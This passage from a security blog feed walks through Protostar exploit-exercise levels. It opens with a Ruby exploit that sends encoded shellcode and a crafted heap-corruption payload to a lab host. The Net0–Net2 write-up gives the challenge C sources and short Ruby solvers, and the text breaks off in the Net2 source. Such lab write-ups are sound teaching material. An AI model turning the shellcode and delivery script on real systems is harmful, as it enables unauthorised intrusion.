</span><span class='line'><span class="c1"># Attempting to encode payload with 1 iterations of x86/shikata_ga_nai</span>
</span><span class='line'><span class="c1"># x86/shikata_ga_nai succeeded with size 95 (iteration=0)</span>
</span><span class='line'><span class="c1"># Payload size: 95 bytes</span>
</span><span class='line'><span class="n">buf</span> <span class="o">=</span>
</span><span class='line'><span class="s2">&quot;</span><span class="se">\xbf\x9e\x53\x7d\x18\xda\xc5\xd9\x74\x24\xf4\x5e\x33\xc9</span><span class="s2">&quot;</span> <span class="o">+</span>
</span><span class='line'><span class="s2">&quot;</span><span class="se">\xb1\x12\x31\x7e\x12\x83\xee\xfc\x03\xe0\x5d\x9f\xed\x2d</span><span class="s2">&quot;</span> <span class="o">+</span>
</span><span class='line'><span class="s2">&quot;</span><span class="se">\xb9\xa8\xed\x1e\x7e\x04\x98\xa2\x09\x4b\xec\xc4\xc4\x0c</span><span class="s2">&quot;</span> <span class="o">+</span>
</span><span class='line'><span class="s2">&quot;</span><span class="se">\x9e\x51\x67\x33\x6c\xe1\xce\x35\x97\x89\xaf\xc5\x67\x48</span><span class="s2">&quot;</span> <span class="o">+</span>
</span><span class='line'><span class="s2">&quot;</span><span class="se">\x38\xc4\x67\x4f\x81\x41\x86\xff\x97\x01\x18\xac\xe4\xa1</span><span class="s2">&quot;</span> <span class="o">+</span>
</span><span class='line'><span class="s2">&quot;</span><span class="se">\x13\xb3\xc6\x26\x71\x5b\xf6\x09\x05\xf3\x60\x79\x8b\x6a</span><span class="s2">&quot;</span> <span class="o">+</span>
</span><span class='line'><span class="s2">&quot;</span><span class="se">\x1f\x0c\xa8\x3e\x8c\x87\xce\x0e\x39\x55\x90</span><span class="s2">&quot;</span>
</span><span class='line'>
</span><span class='line'><span class="n">chunk1</span> <span class="o">=</span> <span class="s2">&quot;FSRD&quot;</span> <span class="o">+</span> <span class="s2">&quot;Aa0A&quot;</span> <span class="o">+</span> <span class="s2">&quot;</span><span class="se">\xeb\x0a</span><span class="s2">&quot;</span> <span class="o">+</span> <span class="s2">&quot;X&quot;</span> <span class="o">*</span> <span class="mi">10</span> <span class="o">+</span> <span class="n">buf</span> <span class="o">+</span> <span class="s2">&quot;D&quot;</span> <span class="o">*</span> <span class="p">(</span><span class="mi">107</span> <span class="o">-</span> <span class="n">buf</span><span class="o">.</span><span class="n">length</span><span class="p">)</span> <span class="o">+</span> <span class="s2">&quot;/&quot;</span>
</span><span class='line'><span class="n">chunk2</span> <span class="o">=</span> <span class="s2">&quot;FSRD&quot;</span> <span class="o">+</span> <span class="s2">&quot;ROOT/&quot;</span> <span class="o">+</span> <span class="o">[</span><span class="mh">0xfffffff8</span><span class="o">].</span><span class="n">pack</span><span class="p">(</span><span class="s2">&quot;V&quot;</span><span class="p">)</span> <span class="o">+</span> <span class="o">[</span><span class="mh">0xfffffffc</span><span class="o">].</span><span class="n">pack</span><span class="p">(</span><span class="s2">&quot;V&quot;</span><span class="p">)</span> <span class="o">+</span> <span class="o">[</span><span class="mh">0x804d410</span><span class="o">].</span><span class="n">pack</span><span class="p">(</span><span class="s2">&quot;V&quot;</span><span class="p">)</span> <span class="o">+</span> <span class="o">[</span><span class="mh">0x804e010</span><span class="o">].</span><span class="n">pack</span><span class="p">(</span><span class="s2">&quot;V&quot;</span><span class="p">)</span> <span class="o">+</span> <span class="s2">&quot;X&quot;</span> <span class="o">*</span>  <span class="mi">103</span>
</span><span class='line'><span class="n">chunk3</span> <span class="o">=</span> <span class="s2">&quot;DDDD&quot;</span>
</span><span class='line'>
</span><span class='line'><span class="n">exploit</span> <span class="o">=</span> <span class="n">chunk1</span> <span class="o">+</span> <span class="n">chunk2</span> <span class="o">+</span> <span class="n">chunk3</span>
</span><span class='line'>
</span><span class='line'><span class="n">host</span> <span class="o">=</span> <span class="no">ARGV</span><span class="o">[</span><span class="mi">0</span><span class="o">]</span>
</span><span class='line'><span class="n">host</span> <span class="o">||=</span> <span class="s2">&quot;192.168.80.154&quot;</span>
</span><span class='line'>
</span><span class='line'><span class="nb">puts</span> <span class="s2">&quot;Using host: </span><span class="si">#{</span><span class="n">host</span><span class="si">}</span><span class="s2">&quot;</span>
</span><span class='line'>
</span><span class='line'><span class="n">s</span> <span class="o">=</span> <span class="no">TCPSocket</span><span class="o">.</span><span class="n">new</span> <span class="n">host</span><span class="p">,</span> <span class="mi">2993</span>
</span><span class='line'><span class="n">s</span><span class="o">.</span><span class="n">puts</span><span class="p">(</span><span class="n">exploit</span><span class="p">)</span>
</span><span class='line'><span class="n">s</span><span class="o">.</span><span class="n">close</span>
</span></code></pre></td></tr></table></div></figure>

]]></content>
  </entry>
  
  <entry>
    <title type="html"><![CDATA[Exploit-Exercises: Protostar (Net Levels)]]></title>
    <link href="http://73696e65.github.io/blog/2015/07/05/exploit-exercises-protostar-net-levels/"/>
    <updated>2015-07-05T06:21:02+02:00</updated>
    <id>http://73696e65.github.io/blog/2015/07/05/exploit-exercises-protostar-net-levels</id>
    <content type="html"><![CDATA[<p>Image: <a href="https://www.vulnhub.com/entry/exploit-exercises-protostar-v2,32/">Exploit-Exercises: Protostar (v2)</a></p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>user@protostar:~$ wget https://raw.githubusercontent.com/73696e65/gdbinit/master/gdb_init.txt --no-check-certificate -O ~/.gdbinit -q</span></code></pre></td></tr></table></div></figure>


<h2>Protostar Net0</h2>

<figure class='code'><figcaption><span>net0.c </span></figcaption>
<div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
<span class='line-number'>21</span>
<span class='line-number'>22</span>
<span class='line-number'>23</span>
<span class='line-number'>24</span>
<span class='line-number'>25</span>
<span class='line-number'>26</span>
<span class='line-number'>27</span>
<span class='line-number'>28</span>
<span class='line-number'>29</span>
<span class='line-number'>30</span>
<span class='line-number'>31</span>
<span class='line-number'>32</span>
<span class='line-number'>33</span>
<span class='line-number'>34</span>
<span class='line-number'>35</span>
<span class='line-number'>36</span>
<span class='line-number'>37</span>
<span class='line-number'>38</span>
<span class='line-number'>39</span>
<span class='line-number'>40</span>
<span class='line-number'>41</span>
<span class='line-number'>42</span>
<span class='line-number'>43</span>
<span class='line-number'>44</span>
<span class='line-number'>45</span>
<span class='line-number'>46</span>
</pre></td><td class='code'><pre><code class='c'><span class='line'><span class="cp">#include &quot;../common/common.c&quot;</span>
</span><span class='line'>
</span><span class='line'><span class="cp">#define NAME &quot;net0&quot;</span>
</span><span class='line'><span class="cp">#define UID 999</span>
</span><span class='line'><span class="cp">#define GID 999</span>
</span><span class='line'><span class="cp">#define PORT 2999</span>
</span><span class='line'>
</span><span class='line'><span class="kt">void</span> <span class="nf">run</span><span class="p">()</span>
</span><span class='line'><span class="p">{</span>
</span><span class='line'>  <span class="kt">unsigned</span> <span class="kt">int</span> <span class="n">i</span><span class="p">;</span>
</span><span class='line'>  <span class="kt">unsigned</span> <span class="kt">int</span> <span class="n">wanted</span><span class="p">;</span>
</span><span class='line'>
</span><span class='line'>  <span class="n">wanted</span> <span class="o">=</span> <span class="n">random</span><span class="p">();</span>
</span><span class='line'>
</span><span class='line'>  <span class="n">printf</span><span class="p">(</span><span class="s">&quot;Please send &#39;%d&#39; as a little endian 32bit int</span><span class="se">\n</span><span class="s">&quot;</span><span class="p">,</span> <span class="n">wanted</span><span class="p">);</span>
</span><span class='line'>
</span><span class='line'>  <span class="k">if</span><span class="p">(</span><span class="n">fread</span><span class="p">(</span><span class="o">&amp;</span><span class="n">i</span><span class="p">,</span> <span class="k">sizeof</span><span class="p">(</span><span class="n">i</span><span class="p">),</span> <span class="mi">1</span><span class="p">,</span> <span class="n">stdin</span><span class="p">)</span> <span class="o">==</span> <span class="nb">NULL</span><span class="p">)</span> <span class="p">{</span>
</span><span class='line'>      <span class="n">errx</span><span class="p">(</span><span class="mi">1</span><span class="p">,</span> <span class="s">&quot;:(</span><span class="se">\n</span><span class="s">&quot;</span><span class="p">);</span>
</span><span class='line'>  <span class="p">}</span>
</span><span class='line'>
</span><span class='line'>  <span class="k">if</span><span class="p">(</span><span class="n">i</span> <span class="o">==</span> <span class="n">wanted</span><span class="p">)</span> <span class="p">{</span>
</span><span class='line'>      <span class="n">printf</span><span class="p">(</span><span class="s">&quot;Thank you sir/madam</span><span class="se">\n</span><span class="s">&quot;</span><span class="p">);</span>
</span><span class='line'>  <span class="p">}</span> <span class="k">else</span> <span class="p">{</span>
</span><span class='line'>      <span class="n">printf</span><span class="p">(</span><span class="s">&quot;I&#39;m sorry, you sent %d instead</span><span class="se">\n</span><span class="s">&quot;</span><span class="p">,</span> <span class="n">i</span><span class="p">);</span>
</span><span class='line'>  <span class="p">}</span>
</span><span class='line'><span class="p">}</span>
</span><span class='line'>
</span><span class='line'><span class="kt">int</span> <span class="nf">main</span><span class="p">(</span><span class="kt">int</span> <span class="n">argc</span><span class="p">,</span> <span class="kt">char</span> <span class="o">**</span><span class="n">argv</span><span class="p">,</span> <span class="kt">char</span> <span class="o">**</span><span class="n">envp</span><span class="p">)</span>
</span><span class='line'><span class="p">{</span>
</span><span class='line'>  <span class="kt">int</span> <span class="n">fd</span><span class="p">;</span>
</span><span class='line'>  <span class="kt">char</span> <span class="o">*</span><span class="n">username</span><span class="p">;</span>
</span><span class='line'>
</span><span class='line'>  <span class="cm">/* Run the process as a daemon */</span>
</span><span class='line'>  <span class="n">background_process</span><span class="p">(</span><span class="n">NAME</span><span class="p">,</span> <span class="n">UID</span><span class="p">,</span> <span class="n">GID</span><span class="p">);</span>
</span><span class='line'>
</span><span class='line'>  <span class="cm">/* Wait for socket activity and return */</span>
</span><span class='line'>  <span class="n">fd</span> <span class="o">=</span> <span class="n">serve_forever</span><span class="p">(</span><span class="n">PORT</span><span class="p">);</span>
</span><span class='line'>
</span><span class='line'>  <span class="cm">/* Set the client socket to STDIN, STDOUT, and STDERR */</span>
</span><span class='line'>  <span class="n">set_io</span><span class="p">(</span><span class="n">fd</span><span class="p">);</span>
</span><span class='line'>
</span><span class='line'>  <span class="cm">/* Don&#39;t do this :&gt; */</span>
</span><span class='line'>  <span class="n">srandom</span><span class="p">(</span><span class="n">time</span><span class="p">(</span><span class="nb">NULL</span><span class="p">));</span>
</span><span class='line'>
</span><span class='line'>  <span class="n">run</span><span class="p">();</span>
</span><span class='line'><span class="p">}</span>
</span></code></pre></td></tr></table></div></figure>


<p>Converting strings to little endian integers. Solution:</p>

<figure class='code'><figcaption><span>net0.rb </span></figcaption>
<div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
</pre></td><td class='code'><pre><code class='ruby'><span class='line'><span class="c1">#!/usr/bin/env ruby</span>
</span><span class='line'>
</span><span class='line'><span class="nb">require</span> <span class="s1">&#39;socket&#39;</span>
</span><span class='line'>
</span><span class='line'><span class="n">host</span> <span class="o">=</span> <span class="s2">&quot;127.0.0.1&quot;</span>
</span><span class='line'><span class="n">port</span> <span class="o">=</span> <span class="mi">2999</span>
</span><span class='line'>
</span><span class='line'><span class="n">s</span> <span class="o">=</span> <span class="no">TCPSocket</span><span class="o">.</span><span class="n">new</span> <span class="n">host</span><span class="p">,</span> <span class="n">port</span>
</span><span class='line'><span class="k">while</span> <span class="n">line</span> <span class="o">=</span> <span class="n">s</span><span class="o">.</span><span class="n">gets</span>
</span><span class='line'>        <span class="nb">puts</span> <span class="n">line</span>
</span><span class='line'>        <span class="n">n</span> <span class="o">=</span> <span class="o">[</span><span class="nb">Integer</span><span class="p">(</span><span class="n">line</span><span class="o">.</span><span class="n">scan</span><span class="p">(</span><span class="sr">/\d+/</span><span class="p">)</span><span class="o">.</span><span class="n">first</span><span class="p">)</span><span class="o">].</span><span class="n">pack</span><span class="p">(</span><span class="s2">&quot;V&quot;</span><span class="p">)</span>
</span><span class='line'>        <span class="n">s</span><span class="o">.</span><span class="n">send</span> <span class="n">n</span><span class="p">,</span> <span class="mi">0</span>
</span><span class='line'>        <span class="n">s</span><span class="o">.</span><span class="n">flush</span>
</span><span class='line'><span class="k">end</span>
</span><span class='line'><span class="n">s</span><span class="o">.</span><span class="n">close</span>
</span></code></pre></td></tr></table></div></figure>




<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>user@protostar:/tmp$ ./net0.rb 
</span><span class='line'>Please send '1690508608' as a little endian 32bit int
</span><span class='line'>Thank you sir/madam</span></code></pre></td></tr></table></div></figure>


<h2>Protostar Net1</h2>

<figure class='code'><figcaption><span>net1.c </span></figcaption>
<div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
<span class='line-number'>21</span>
<span class='line-number'>22</span>
<span class='line-number'>23</span>
<span class='line-number'>24</span>
<span class='line-number'>25</span>
<span class='line-number'>26</span>
<span class='line-number'>27</span>
<span class='line-number'>28</span>
<span class='line-number'>29</span>
<span class='line-number'>30</span>
<span class='line-number'>31</span>
<span class='line-number'>32</span>
<span class='line-number'>33</span>
<span class='line-number'>34</span>
<span class='line-number'>35</span>
<span class='line-number'>36</span>
<span class='line-number'>37</span>
<span class='line-number'>38</span>
<span class='line-number'>39</span>
<span class='line-number'>40</span>
<span class='line-number'>41</span>
<span class='line-number'>42</span>
<span class='line-number'>43</span>
<span class='line-number'>44</span>
<span class='line-number'>45</span>
<span class='line-number'>46</span>
<span class='line-number'>47</span>
<span class='line-number'>48</span>
<span class='line-number'>49</span>
<span class='line-number'>50</span>
<span class='line-number'>51</span>
<span class='line-number'>52</span>
<span class='line-number'>53</span>
<span class='line-number'>54</span>
<span class='line-number'>55</span>
<span class='line-number'>56</span>
</pre></td><td class='code'><pre><code class='c'><span class='line'><span class="cp">#include &quot;../common/common.c&quot;</span>
</span><span class='line'>
</span><span class='line'><span class="cp">#define NAME &quot;net1&quot;</span>
</span><span class='line'><span class="cp">#define UID 998</span>
</span><span class='line'><span class="cp">#define GID 998</span>
</span><span class='line'><span class="cp">#define PORT 2998</span>
</span><span class='line'>
</span><span class='line'><span class="kt">void</span> <span class="nf">run</span><span class="p">()</span>
</span><span class='line'><span class="p">{</span>
</span><span class='line'>  <span class="kt">char</span> <span class="n">buf</span><span class="p">[</span><span class="mi">12</span><span class="p">];</span>
</span><span class='line'>  <span class="kt">char</span> <span class="n">fub</span><span class="p">[</span><span class="mi">12</span><span class="p">];</span>
</span><span class='line'>  <span class="kt">char</span> <span class="o">*</span><span class="n">q</span><span class="p">;</span>
</span><span class='line'>
</span><span class='line'>  <span class="kt">unsigned</span> <span class="kt">int</span> <span class="n">wanted</span><span class="p">;</span>
</span><span class='line'>
</span><span class='line'>  <span class="n">wanted</span> <span class="o">=</span> <span class="n">random</span><span class="p">();</span>
</span><span class='line'>
</span><span class='line'>  <span class="n">sprintf</span><span class="p">(</span><span class="n">fub</span><span class="p">,</span> <span class="s">&quot;%d&quot;</span><span class="p">,</span> <span class="n">wanted</span><span class="p">);</span>
</span><span class='line'>
</span><span class='line'>  <span class="k">if</span><span class="p">(</span><span class="n">write</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">wanted</span><span class="p">,</span> <span class="k">sizeof</span><span class="p">(</span><span class="n">wanted</span><span class="p">))</span> <span class="o">!=</span> <span class="k">sizeof</span><span class="p">(</span><span class="n">wanted</span><span class="p">))</span> <span class="p">{</span>
</span><span class='line'>      <span class="n">errx</span><span class="p">(</span><span class="mi">1</span><span class="p">,</span> <span class="s">&quot;:(</span><span class="se">\n</span><span class="s">&quot;</span><span class="p">);</span>
</span><span class='line'>  <span class="p">}</span>
</span><span class='line'>
</span><span class='line'>  <span class="k">if</span><span class="p">(</span><span class="n">fgets</span><span class="p">(</span><span class="n">buf</span><span class="p">,</span> <span class="k">sizeof</span><span class="p">(</span><span class="n">buf</span><span class="p">)</span><span class="o">-</span><span class="mi">1</span><span class="p">,</span> <span class="n">stdin</span><span class="p">)</span> <span class="o">==</span> <span class="nb">NULL</span><span class="p">)</span> <span class="p">{</span>
</span><span class='line'>      <span class="n">errx</span><span class="p">(</span><span class="mi">1</span><span class="p">,</span> <span class="s">&quot;:(</span><span class="se">\n</span><span class="s">&quot;</span><span class="p">);</span>
</span><span class='line'>  <span class="p">}</span>
</span><span class='line'>
</span><span class='line'>  <span class="n">q</span> <span class="o">=</span> <span class="n">strchr</span><span class="p">(</span><span class="n">buf</span><span class="p">,</span> <span class="sc">&#39;\r&#39;</span><span class="p">);</span> <span class="k">if</span><span class="p">(</span><span class="n">q</span><span class="p">)</span> <span class="o">*</span><span class="n">q</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
</span><span class='line'>  <span class="n">q</span> <span class="o">=</span> <span class="n">strchr</span><span class="p">(</span><span class="n">buf</span><span class="p">,</span> <span class="sc">&#39;\n&#39;</span><span class="p">);</span> <span class="k">if</span><span class="p">(</span><span class="n">q</span><span class="p">)</span> <span class="o">*</span><span class="n">q</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
</span><span class='line'>
</span><span class='line'>  <span class="k">if</span><span class="p">(</span><span class="n">strcmp</span><span class="p">(</span><span class="n">fub</span><span class="p">,</span> <span class="n">buf</span><span class="p">)</span> <span class="o">==</span> <span class="mi">0</span><span class="p">)</span> <span class="p">{</span>
</span><span class='line'>      <span class="n">printf</span><span class="p">(</span><span class="s">&quot;you correctly sent the data</span><span class="se">\n</span><span class="s">&quot;</span><span class="p">);</span>
</span><span class='line'>  <span class="p">}</span> <span class="k">else</span> <span class="p">{</span>
</span><span class='line'>      <span class="n">printf</span><span class="p">(</span><span class="s">&quot;you didn&#39;t send the data properly</span><span class="se">\n</span><span class="s">&quot;</span><span class="p">);</span>
</span><span class='line'>  <span class="p">}</span>
</span><span class='line'><span class="p">}</span>
</span><span class='line'>
</span><span class='line'><span class="kt">int</span> <span class="nf">main</span><span class="p">(</span><span class="kt">int</span> <span class="n">argc</span><span class="p">,</span> <span class="kt">char</span> <span class="o">**</span><span class="n">argv</span><span class="p">,</span> <span class="kt">char</span> <span class="o">**</span><span class="n">envp</span><span class="p">)</span>
</span><span class='line'><span class="p">{</span>
</span><span class='line'>  <span class="kt">int</span> <span class="n">fd</span><span class="p">;</span>
</span><span class='line'>  <span class="kt">char</span> <span class="o">*</span><span class="n">username</span><span class="p">;</span>
</span><span class='line'>
</span><span class='line'>  <span class="cm">/* Run the process as a daemon */</span>
</span><span class='line'>  <span class="n">background_process</span><span class="p">(</span><span class="n">NAME</span><span class="p">,</span> <span class="n">UID</span><span class="p">,</span> <span class="n">GID</span><span class="p">);</span>
</span><span class='line'>
</span><span class='line'>  <span class="cm">/* Wait for socket activity and return */</span>
</span><span class='line'>  <span class="n">fd</span> <span class="o">=</span> <span class="n">serve_forever</span><span class="p">(</span><span class="n">PORT</span><span class="p">);</span>
</span><span class='line'>
</span><span class='line'>  <span class="cm">/* Set the client socket to STDIN, STDOUT, and STDERR */</span>
</span><span class='line'>  <span class="n">set_io</span><span class="p">(</span><span class="n">fd</span><span class="p">);</span>
</span><span class='line'>
</span><span class='line'>  <span class="cm">/* Don&#39;t do this :&gt; */</span>
</span><span class='line'>  <span class="n">srandom</span><span class="p">(</span><span class="n">time</span><span class="p">(</span><span class="nb">NULL</span><span class="p">));</span>
</span><span class='line'>
</span><span class='line'>  <span class="n">run</span><span class="p">();</span>
</span><span class='line'><span class="p">}</span>
</span></code></pre></td></tr></table></div></figure>


<p>Another easy challenge, we need to convert binary integers to string. Solution:</p>

<figure class='code'><figcaption><span>net1.rb </span></figcaption>
<div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
</pre></td><td class='code'><pre><code class='ruby'><span class='line'><span class="c1">#!/usr/bin/env ruby</span>
</span><span class='line'>
</span><span class='line'><span class="nb">require</span> <span class="s1">&#39;socket&#39;</span>
</span><span class='line'>
</span><span class='line'><span class="n">host</span> <span class="o">=</span> <span class="s2">&quot;127.0.0.1&quot;</span>
</span><span class='line'><span class="n">port</span> <span class="o">=</span> <span class="mi">2998</span>
</span><span class='line'>
</span><span class='line'><span class="n">s</span> <span class="o">=</span> <span class="no">TCPSocket</span><span class="o">.</span><span class="n">new</span> <span class="n">host</span><span class="p">,</span> <span class="n">port</span>
</span><span class='line'>
</span><span class='line'><span class="n">x</span> <span class="o">=</span> <span class="n">s</span><span class="o">.</span><span class="n">recv</span><span class="p">(</span><span class="mi">4</span><span class="p">)</span><span class="o">.</span><span class="n">unpack</span><span class="p">(</span><span class="s1">&#39;I&#39;</span><span class="p">)</span><span class="o">.</span><span class="n">first</span><span class="o">.</span><span class="n">to_s</span>
</span><span class='line'><span class="n">s</span><span class="o">.</span><span class="n">send</span> <span class="n">x</span><span class="p">,</span> <span class="mi">0</span>
</span><span class='line'>
</span><span class='line'><span class="nb">puts</span> <span class="n">s</span><span class="o">.</span><span class="n">gets</span>
</span><span class='line'><span class="n">s</span><span class="o">.</span><span class="n">close</span>
</span></code></pre></td></tr></table></div></figure>




<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>user@protostar:/tmp$ ./net1.rb 
</span><span class='line'>you correctly sent the data</span></code></pre></td></tr></table></div></figure>


<h2>Protostar Net2</h2>

<figure class='code'><figcaption><span>net2.c </span></figcaption>
<div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
<span class='line-number'>21</span>
<span class='line-number'>22</span>
<span class='line-number'>23</span>
<span class='line-number'>24</span>
<span class='line-number'>25</span>
<span class='line-number'>26</span>
<span class='line-number'>27</span>
<span class='line-number'>28</span>
<span class='line-number'>29</span>
<span class='line-number'>30</span>
<span class='line-number'>31</span>
<span class='line-number'>32</span>
<span class='line-number'>33</span>
<span class='line-number'>34</span>
<span class='line-number'>35</span>
<span class='line-number'>36</span>
<span class='line-number'>37</span>
<span class='line-number'>38</span>
<span class='line-number'>39</span>
<span class='line-number'>40</span>
<span class='line-number'>41</span>
<span class='line-number'>42</span>
<span class='line-number'>43</span>
<span class='line-number'>44</span>
<span class='line-number'>45</span>
<span class='line-number'>46</span>
<span class='line-number'>47</span>
<span class='line-number'>48</span>
<span class='line-number'>49</span>
<span class='line-number'>50</span>
<span class='line-number'>51</span>
<span class='line-number'>52</span>
<span class='line-number'>53</span>
<span class='line-number'>54</span>
</pre></td><td class='code'><pre><code class='c'><span class='line'><span class="cp">#include &quot;../common/common.c&quot;</span>
</span><span class='line'>
</span><span class='line'><span class="cp">#define NAME &quot;net2&quot;</span>
</span><span class='line'><span class="cp">#define UID 997</span>
</span><span class='line'><span class="cp">#define GID 997</span>
</span><span class='line'><span class="cp">#define PORT 2997</span>
</span><span class='line'>
</span><span class='line'><span class="kt">void</span> <span class="nf">run</span><span class="p">()</span>
</span><span class='line'><span class="p">{</span>
</span><span class='line'>  <span class="kt">unsigned</span> <span class="kt">int</span> <span class="n">quad</span><span class="p">[</span><span class="mi">4</span><span class="p">];</span>
</span><span class='line'>  <span class="kt">int</span> <span class="n">i</span><span class="p">;</span>
</span><span class='line'>  <span class="kt">unsigned</span> <span class="kt">int</span> <span class="n">result</span><span class="p">,</span> <span class="n">wanted</span><span class="p">;</span>
</span><span class='line'>
</span><span class='line'>  <span class="n">result</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
</span><span class='line'>  <span class="k">for</span><span class="p">(</span><span class="n">i</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span> <span class="n">i</span> <span class="o">&lt;</span> <span class="mi">4</span><span class="p">;</span> <span class="n">i</span><span class="o">++</span><span class="p">)</span> <span class="p">{</span>
</span><span class='line'>      <span class="n">quad</span><span class="p">[</span><span class="n">i</span><span class="p">]</span> <span class="o">=</span> <span class="n">random</span><span class="p">();</span>
</span><span class='line'>      <span class="n">result</span> <span class="o">+=</span> <span class="n">quad</span><span class="p">[</span><span class="n">i</span><span class="p">];</span>
</span><span class='line'>
</span><span class='line'>      <span class="k">if</span><span class="p">(</span><span class="n">write</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span> <span class="o">&amp;</span><span class="p">(</span><span class="n">quad</span><span class="p">[</span><span class="n">i</span><span class="p">]),</span> <span class="k">sizeof</span><span class="p">(</span><span class="n">result</span><span class="p">))</span> <span class="o">!=</span> <span class="k">sizeof</span><span class="p">(</span><span class="n">result</span><span class="p">))</span> <span class="p">{</span>
</span><span class='line'>          <span class="n">errx</span><span class="p">(</span><span class="mi">1</span><span class="p">,</span> <span class="s">&quot;:(</span><span class="se">\n</span><span class="s">&quot;</span><span class="p">);</span>
</span><span class='line'>      <span class="p">}</span>
</span><span class='line'>  <span class="p">}</span>
</span><span class='line'>
</span><span class='line'>  <span class="k">if</span><span class="p">(</span><span class="n">read</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">wanted</span><span class="p">,</span> <span class="k">sizeof</span><span class="p">(</span><span class="n">result</span><span class="p">))</span> <span class="o">!=</span> <span class="k">sizeof</span><span class="p">(</span><span class="n">result</span><span class="p">))</span> <span class="p">{</span>
</span><span class='line'>      <span class="n">errx</span><span class="p">(</span><span class="mi">1</span><span class="p">,</span> <span class="s">&quot;:&lt;</span><span class="se">\n</span><span class="s">&quot;</span><span class="p">);</span>
</span><span class='line'>  <span class="p">}</span>
</span><span class='line'>
</span><span class='line'>
</span><span class='line'>  <span class="k">if</span><span class="p">(</span><span class="n">result</span> <span class="o">==</span> <span class="n">wanted</span><span class="p">)</span> <span class="p">{</span>
</span><span class='line'>      <span class="n">printf</span><span class="p">(</span><span class="s">&quot;you added them correctly</span><span class="se">\n</span><span class="s">&quot;</span><span class="p">);</span>
</span><span class='line'>  <span class="p">}</span> <span class="k">else</span> <span class="p">{</span>
</span><span class='line'>      <span class="n">printf</span><span class="p">(</span><span class="s">&quot;sorry, try again. invalid</span><span class="se">\n</span><span class="s">&quot;</span><span class="p">);</span>
</span><span class='line'>  <span class="p">}</span>
</span><span class='line'><span class="p">}</span>
</span><span class='line'>
</span><span class='line'><span class="kt">int</span> <span class="nf">main</span><span class="p">(</span><span class="kt">int</span> <span class="n">argc</span><span class="p">,</span> <span class="kt">char</span> <span class="o">**</span><span class="n">argv</span><span class="p">,</span> <span class="kt">char</span> <span class="o">**</span><span class="n">envp</span><span class="p">)</span>
</span><span class='line'><span class="p">{</span>
</span><span class='line'>  <span class="kt">int</span> <span class="n">fd</span><span class="p">;</span>
</span><span class='line'>  <span class="kt">char</span> <span class="o">*</span><span class="n">username</span><span class="p">;</span>
</span><span class='line'>
</span><span class='line'>  <span class="cm">/* Run the process as a daemon */</span>
</span><span class='line'>  <span class="n">background_process</span><span class="p">(</span><span class="n">NAME</span><span class="p">,</span> <span class="n">UID</span><span class="p">,</span> <span class="n">GID</span><span class="p">);</span>
</span><span class='line'>
</span><span class='line'>  <span class="cm">/* Wait for socket activity and return */</span>
</span><span class='line'>  <span class="n">fd</span> <span class="o">=</span> <span class="n">serve_forever</span><span class="p">(</span><span class="n">PORT</span><span class="p">);</span>
</span><span class='line'>
</span><span class='line'>  <span class="cm">/* Set the client socket to STDIN, STDOUT, and STDERR */</span>
